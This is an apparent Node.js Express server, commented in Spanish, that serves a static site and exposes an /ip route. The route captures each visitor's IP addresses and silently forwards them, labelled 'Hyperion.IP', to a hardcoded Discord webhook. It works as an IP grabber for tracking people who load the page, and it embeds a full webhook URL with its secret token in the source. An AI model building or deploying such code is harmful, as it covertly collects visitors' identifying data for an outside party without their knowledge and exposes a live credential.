const express = require("express");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Tu webhook de Discord (solo local)
// En producción en Render es mejor usar ENV: process.env.DISCORD_WEBHOOK
const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1457199874100432970/2MP1g97e4ngqalHL7L6GsFtkV2RAvFk2JAkHkspnzizKmQ7HKr8b77msdiGxE4YTIzTf"; 

// Servir archivos estáticos de /public
app.use(express.static(path.join(__dirname, "public")));

// Ruta para devolver las IPs
app.get("/ip", async (req, res) => {
  const raw = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";

  const ips = raw.split(",").map(ip => ip.trim());

  // Responder al frontend
  res.json({ ips });

  // Construir mensaje para Discord
  const message = ips
    .map((ip, index) => `Hyperion.IP ${index + 1}: ${ip}`)
    .join("\n");

  // Enviar a Discord
  try {
    if (DISCORD_WEBHOOK) {
      await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message })
      });
    } else {
      console.log("No webhook URL set.");
    }
  } catch (err) {
    console.error("Error sending webhook:", err);
  }
});

// Levantar servidor
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
